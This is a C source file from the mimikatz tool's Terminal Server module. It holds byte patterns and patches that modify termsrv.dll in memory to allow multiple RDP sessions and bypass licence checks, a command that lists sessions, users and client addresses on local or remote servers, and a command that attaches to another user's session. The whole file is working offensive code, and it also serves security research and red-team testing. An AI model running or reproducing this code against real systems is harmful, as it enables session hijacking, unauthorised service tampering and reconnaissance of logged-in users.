/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_ts.h"

const KUHL_M_C kuhl_m_c_ts[] = {
	{kuhl_m_ts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
	{kuhl_m_ts_sessions,	L"sessions",	NULL},
	{kuhl_m_ts_remote,		L"remote",		NULL},
};
const KUHL_M kuhl_m_ts = {
	L"ts",	L"Terminal Server module", NULL,
	ARRAYSIZE(kuhl_m_c_ts), kuhl_m_c_ts, NULL, NULL
};

#ifdef _M_X64
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_W10_1803_Query__CDefPolicy[] = {0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};
BYTE PTRN_W10_1809_Query__CDefPolicy[] = {0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_W10_1803_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};
BYTE PATC_W10_1809_Query__CDefPolicy[] = {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
#elif defined _M_IX86
BYTE PTRN_WN60_Query__CDefPolicy[]	= {0x3b, 0x91, 0x20, 0x03, 0x00, 0x00, 0x5e, 0x0f, 0x84};
BYTE PTRN_WN6x_Query__CDefPolicy[]	= {0x3b, 0x86, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PTRN_WN81_Query__CDefPolicy[]	= {0x3b, 0x81, 0x20, 0x03, 0x00, 0x00, 0x0f, 0x84};
BYTE PATC_WN60_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x5e, 0x90, 0x90};
BYTE PATC_WN6x_Query__CDefPolicy[]	= {0xc7, 0x86, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
BYTE PATC_WN81_Query__CDefPolicy[]	= {0xc7, 0x81, 0x20, 0x03, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};
#endif
BYTE PTRN_WIN5_TestLicence[]		= {0x83, 0xf8, 0x02, 0x7f};
BYTE PATC_WIN5_TestLicence[]		= {0x90, 0x90};
KULL_M_PATCH_GENERIC TermSrvMultiRdpReferences[] = {
	{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_TestLicence),			PTRN_WIN5_TestLicence},			{sizeof(PATC_WIN5_TestLicence),			PATC_WIN5_TestLicence},			{3}},
	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WN60_Query__CDefPolicy),	PTRN_WN60_Query__CDefPolicy},	{sizeof(PATC_WN60_Query__CDefPolicy),	PATC_WN60_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN6x_Query__CDefPolicy),	PTRN_WN6x_Query__CDefPolicy},	{sizeof(PATC_WN6x_Query__CDefPolicy),	PATC_WN6x_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_Query__CDefPolicy),	PTRN_WN81_Query__CDefPolicy},	{sizeof(PATC_WN81_Query__CDefPolicy),	PATC_WN81_Query__CDefPolicy},	{0}},
#ifdef _M_X64
	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1803_Query__CDefPolicy),	PTRN_W10_1803_Query__CDefPolicy},	{sizeof(PATC_W10_1803_Query__CDefPolicy),	PATC_W10_1803_Query__CDefPolicy},	{0}},
	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_Query__CDefPolicy),	PTRN_W10_1809_Query__CDefPolicy},	{sizeof(PATC_W10_1809_Query__CDefPolicy),	PATC_W10_1809_Query__CDefPolicy},	{0}},
#endif
};
NTSTATUS kuhl_m_ts_multirdp(int argc, wchar_t * argv[])
{
	kull_m_patch_genericProcessOrServiceFromBuild(TermSrvMultiRdpReferences, ARRAYSIZE(TermSrvMultiRdpReferences), L"TermService", L"termsrv.dll", TRUE);
	return STATUS_SUCCESS;
}

const PCWCHAR states[] = {L"Active", L"Connected", L"ConnectQuery", L"Shadow", L"Disconnected", L"Idle", L"Listen", L"Reset", L"Down", L"Init",};
NTSTATUS kuhl_m_ts_sessions(int argc, wchar_t * argv[])
{
	LPCWSTR szServer = NULL;
	PSESSIONIDW sessions;
	WINSTATIONINFORMATION info;
	WINSTATIONREMOTEADDRESS addr;
	BOOL locked;
	DWORD i, count, cur, ret;
	BOOL isCur = ProcessIdToSessionId(GetCurrentProcessId(), &cur);
	HANDLE hServer = SERVERHANDLE_CURRENT;
	wchar_t ip[46];

	if(kull_m_string_args_byName(argc, argv, L"server", &szServer, NULL))
	{
		isCur = FALSE;
		kprintf(L"Remote server: %s\n", szServer);
		hServer = WinStationOpenServerW((PWSTR) szServer);
		if(!hServer)
			PRINT_ERROR_AUTO(L"WinStationOpenServerW");
	}

	if(hServer || !szServer)
	{
		if(WinStationEnumerateW(hServer, &sessions, &count))
		{
			for(i = 0; i < count; i++)
			{
				kprintf(L"\nSession: %s%u - %s\n  state: %s (%u)\n", (isCur && (cur == sessions[i].SessionId)) ? L"*" : L"", sessions[i].SessionId, sessions[i].WinStationName, (sessions[i].State < ARRAYSIZE(states)) ? states[sessions[i].State] : L"?", sessions[i].State);
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationInformation, &info, sizeof(WINSTATIONINFORMATION), &ret))
				{
					kprintf(L"  user : %s @ %s\n", info.UserName, info.Domain);
					if(*(PULONGLONG) &info.ConnectTime)
					{
						kprintf(L"  Conn : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.ConnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.DisconnectTime)
					{
						kprintf(L"  disc : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.DisconnectTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LogonTime)
					{
						kprintf(L"  logon: ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.LogonTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.LastInputTime)
					{
						kprintf(L"  last : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.LastInputTime);
						kprintf(L"\n");
					}
					if(*(PULONGLONG) &info.CurrentTime)
					{
						kprintf(L"  curr : ");
						kull_m_string_displayLocalFileTime((PFILETIME) &info.CurrentTime);
						kprintf(L"\n");
					}
				}
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationLockedState, &locked, sizeof(BOOL), &ret))
					kprintf(L"  lock : %s\n", locked ? L"yes" : L"no");
				if(WinStationQueryInformationW(hServer, sessions[i].SessionId, WinStationRemoteAddress, &addr, sizeof(WINSTATIONREMOTEADDRESS), &ret))
				{
					if(addr.sin_family == AF_INET)
					{
						if(RtlIpv4AddressToStringW((const IN_ADDR *) &addr.ipv4.in_addr, ip))
							kprintf(L"  addr4: %s\n", ip);
					}
					else if(addr.sin_family == 23) // AF_INET6
					{
						if(RtlIpv6AddressToStringW((const PVOID) &addr.ipv6.sin6_addr, ip))
							kprintf(L"  addr6: %s\n", ip);
					}
				}
			}
			if(!count)
				PRINT_ERROR(L"WinStationEnumerateW gave 0 result (maybe access problem?)\n");
			WinStationFreeMemory(sessions);
		}
		else PRINT_ERROR_AUTO(L"WinStationEnumerateW");
	}
	else PRINT_ERROR(L"No server HANDLE\n");
	if(hServer)
		WinStationCloseServer(hServer);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_ts_remote(int argc, wchar_t * argv[])
{
	LPCWSTR szId, szPassword;
	DWORD id, target;
	if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
	{
		id = wcstoul(szId, NULL, 0);
		if(kull_m_string_args_byName(argc, argv, L"target", &szId, NULL))
			target = wcstoul(szId, NULL, 0);
		else target = LOGONID_CURRENT;
		
		kull_m_string_args_byName(argc, argv, L"password", &szPassword, L"");

		kprintf(L"Asking to connect from %u to ", id);
		if(target == LOGONID_CURRENT)
			kprintf(L"current session");
		else kprintf(L"%u", target);
		
		kprintf(L"\n\n> ");
		if(WinStationConnectW(SERVERHANDLE_CURRENT, id, target, (LPWSTR) szPassword, FALSE))
			kprintf(L"Connected to %u\n", id);
		else if(GetLastError() == ERROR_LOGON_FAILURE)
			PRINT_ERROR(L"Bad password for this session (take care to not lock the account!)\n");
		else PRINT_ERROR_AUTO(L"WinStationConnect");
	}
	else PRINT_ERROR(L"Argument id is needed\n");
	return STATUS_SUCCESS;
}